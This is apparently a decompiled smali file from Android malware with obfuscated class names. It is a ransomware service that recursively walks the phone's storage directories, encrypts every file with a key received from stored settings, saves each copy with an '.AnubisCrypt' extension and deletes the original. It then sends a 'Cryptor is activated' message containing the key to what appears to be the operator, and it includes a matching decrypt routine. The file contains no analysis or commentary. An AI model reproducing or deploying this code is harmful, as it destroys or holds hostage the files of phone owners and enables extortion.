.class public Lwocwvy/czyxoxmbauu/slsa/wahiuolww;
.super Landroid/app/IntentService;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/b;

.field b:Ljava/lang/String;

.field c:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, "wahiuolww"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, ""

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->b:Ljava/lang/String;

    const-string v0, ""

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->c:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method a(Ljava/io/File;)V
    .locals 9

    :try_start_0
    invoke-virtual {p1}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object p1

    array-length v0, p1

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_3

    aget-object v2, p1, v1

    invoke-virtual {v2}, Ljava/io/File;->isDirectory()Z

    move-result v3

    if-eqz v3, :cond_0

    invoke-virtual {p0, v2}, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->b(Ljava/io/File;)V

    goto/16 :goto_2

    :cond_0
    invoke-virtual {v2}, Ljava/io/File;->isFile()Z

    move-result v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-eqz v3, :cond_2

    :try_start_1
    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-static {v2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/io/File;)[B

    move-result-object v3

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->b:Ljava/lang/String;

    const-string v5, "crypt"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    const/4 v5, 0x1

    if-eqz v4, :cond_1

    invoke-virtual {v2}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v4

    const-string v6, ".AnubisCrypt"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->c:Ljava/lang/String;

    invoke-virtual {v4, v3, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->a([BLjava/lang/String;)[B

    move-result-object v3

    new-instance v4, Ljava/io/FileOutputStream;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, ".AnubisCrypt"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6, v5}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;Z)V

    invoke-virtual {v4, v3}, Ljava/io/FileOutputStream;->write([B)V

    :goto_1
    invoke-virtual {v4}, Ljava/io/FileOutputStream;->close()V

    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    goto :goto_2

    :cond_1
    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->b:Ljava/lang/String;

    const-string v6, "decrypt"

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    invoke-virtual {v2}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v4

    const-string v6, ".AnubisCrypt"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_2

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->c:Ljava/lang/String;

    invoke-virtual {v4, v3, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->b([BLjava/lang/String;)[B

    move-result-object v3

    new-instance v4, Ljava/io/FileOutputStream;

    invoke-virtual {v2}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v6

    const-string v7, ".AnubisCrypt"

    const-string v8, ""

    invoke-virtual {v6, v7, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6, v5}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;Z)V

    invoke-virtual {v4, v3}, Ljava/io/FileOutputStream;->write([B)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :catch_0
    :cond_2
    :goto_2
    add-int/lit8 v1, v1, 0x1

    goto/16 :goto_0

    :catch_1
    :cond_3
    return-void
.end method

.method b(Ljava/io/File;)V
    .locals 9

    :try_start_0
    invoke-virtual {p1}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object p1

    array-length v0, p1

    const/4 v1, 0x0

    :goto_0
    if-ge v1, v0, :cond_3

    aget-object v2, p1, v1

    invoke-virtual {v2}, Ljava/io/File;->isDirectory()Z

    move-result v3

    if-eqz v3, :cond_0

    invoke-virtual {p0, v2}, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->b(Ljava/io/File;)V

    goto/16 :goto_2

    :cond_0
    invoke-virtual {v2}, Ljava/io/File;->isFile()Z

    move-result v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-eqz v3, :cond_2

    :try_start_1
    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-static {v2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/io/File;)[B

    move-result-object v3

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->b:Ljava/lang/String;

    const-string v5, "crypt"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    const/4 v5, 0x1

    if-eqz v4, :cond_1

    invoke-virtual {v2}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v4

    const-string v6, ".AnubisCrypt"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->c:Ljava/lang/String;

    invoke-virtual {v4, v3, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->a([BLjava/lang/String;)[B

    move-result-object v3

    new-instance v4, Ljava/io/FileOutputStream;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, ".AnubisCrypt"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6, v5}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;Z)V

    invoke-virtual {v4, v3}, Ljava/io/FileOutputStream;->write([B)V

    :goto_1
    invoke-virtual {v4}, Ljava/io/FileOutputStream;->close()V

    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    goto :goto_2

    :cond_1
    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->b:Ljava/lang/String;

    const-string v6, "decrypt"

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    invoke-virtual {v2}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v4

    const-string v6, ".AnubisCrypt"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_2

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->c:Ljava/lang/String;

    invoke-virtual {v4, v3, v6}, Lwocwvy/czyxoxmbauu/slsa/b;->b([BLjava/lang/String;)[B

    move-result-object v3

    new-instance v4, Ljava/io/FileOutputStream;

    invoke-virtual {v2}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v6

    const-string v7, ".AnubisCrypt"

    const-string v8, ""

    invoke-virtual {v6, v7, v8}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v4, v6, v5}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;Z)V

    invoke-virtual {v4, v3}, Ljava/io/FileOutputStream;->write([B)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :catch_0
    :cond_2
    :goto_2
    add-int/lit8 v1, v1, 0x1

    goto/16 :goto_0

    :catch_1
    :cond_3
    return-void
.end method

.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 6

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "status"

    invoke-virtual {p1, p0, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->b:Ljava/lang/String;

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "key"

    invoke-virtual {p1, p0, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->c:Ljava/lang/String;

    new-instance p1, Ljava/io/File;

    const-string v0, "/mnt"

    invoke-direct {p1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v0, Ljava/io/File;

    const-string v1, "/mount"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v1, Ljava/io/File;

    const-string v2, "/sdcard"

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v2, Ljava/io/File;

    const-string v3, "/storage"

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    :try_start_0
    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "Cryptolocker"

    const-string v5, "1"

    invoke-virtual {v3, v4, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v3

    invoke-virtual {p0, v3}, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a(Ljava/io/File;)V

    iget-object v3, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "Cryptolocker"

    const-string v5, "2"

    invoke-virtual {v3, v4, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :try_start_1
    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a(Ljava/io/File;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v3, "Cryptolocker"

    const-string v4, "3"

    invoke-virtual {p1, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :try_start_2
    invoke-virtual {p0, v0}, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a(Ljava/io/File;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "Cryptolocker"

    const-string v3, "4"

    invoke-virtual {p1, v0, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    :try_start_3
    invoke-virtual {p0, v1}, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a(Ljava/io/File;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "Cryptolocker"

    const-string v1, "5"

    invoke-virtual {p1, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    :catch_3
    :try_start_4
    invoke-virtual {p0, v2}, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a(Ljava/io/File;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "Cryptolocker"

    const-string v1, "6"

    invoke-virtual {p1, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    :catch_4
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->b:Ljava/lang/String;

    const-string v0, "crypt"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "4"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "p="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v4, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->q(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "|The Cryptor is activated, the file system is encrypted by key: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->c:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, p0, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "cryptfile"

    const-string v1, "true"

    :goto_0
    invoke-virtual {p1, p0, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    :cond_0
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->b:Ljava/lang/String;

    const-string v0, "decrypt"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "4"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "p="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v4, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v4, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->q(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "|File System is Decrypted!|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, p0, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "cryptfile"

    const-string v1, "false"

    goto :goto_0

    :cond_1
    :goto_1
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "status"

    const-string v1, ""

    invoke-virtual {p1, p0, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/wahiuolww;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "key"

    const-string v1, ""

    invoke-virtual {p1, p0, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method
